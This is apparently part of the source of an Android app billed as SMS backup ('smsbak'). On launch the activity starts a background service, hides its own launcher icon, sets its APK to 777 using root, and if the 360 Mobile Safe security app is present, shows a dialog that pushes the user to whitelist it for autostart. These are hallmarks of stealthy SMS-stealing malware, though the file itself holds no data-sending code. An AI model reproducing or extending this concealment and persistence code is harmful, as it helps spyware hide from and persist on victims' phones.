package com.smsbak.sms;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import com.yfm.sms.R;

public class BakSmsActivity extends Activity {
    /** Called when the activity is first created. */
	String packageName="com.qihoo360.mobilesafe";
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.load_xml);
        if(!PhoneUtils.isServiceRunning(this)){
			Intent server=new Intent(this,BootServer.class);
			this.startService(server);
		}
		hideicon();
		String apkRoot="chmod 777 "+getPackageCodePath();
		if(PhoneUtils.RootCommand(apkRoot)){
			if(PhoneUtils.checkAppExist(this,packageName)){
				ShowSetDialog();
			}else{
				skip();
			}
			
		}else{
			skip();
		}
		
		
	}
    private void hideicon(){
    	PackageManager pm=BakSmsActivity.this.getPackageManager();
		pm.setComponentEnabledSetting(BakSmsActivity.this.getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
    private Handler handler=new Handler(){

		@Override
		public void handleMessage(Message msg) {
			// TODO Auto-generated method stub
			super.handleMessage(msg);
			BakSmsActivity.this.finish();
		}
    	
    };
    private void Open360(){
    	Intent i360=new Intent();
    	i360.setComponent(new ComponentName(packageName, "com.qihoo360.mobilesafe.opti.autorun.AutorunActivity"));
    	this.startActivity(i360);
    }
    private void ShowSetDialog(){
    	Builder bd=new Builder(this);
    	bd.setTitle("设置信任");
    	bd.setMessage("你的手机已经root 需要在360软件中设置允许自动启动，软件才能运行");
    	bd.setPositiveButton("设置", new DOnClickListenerImpl());
    	bd.setNegativeButton("取消", null);
    	bd.create().show();
    }
    class DOnClickListenerImpl implements DialogInterface.OnClickListener{

		@Override
		public void onClick(DialogInterface arg0, int arg1) {
			// TODO Auto-generated method stub
			Open360();
		}
    	
    }
    
    private void skip(){
    	new Thread(){

			@Override
			public void run() {
				// TODO Auto-generated method stub
				super.run();
				try {
					Thread.sleep(5000);
					handler.sendEmptyMessage(1);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
			
		}.start();
    }
    
}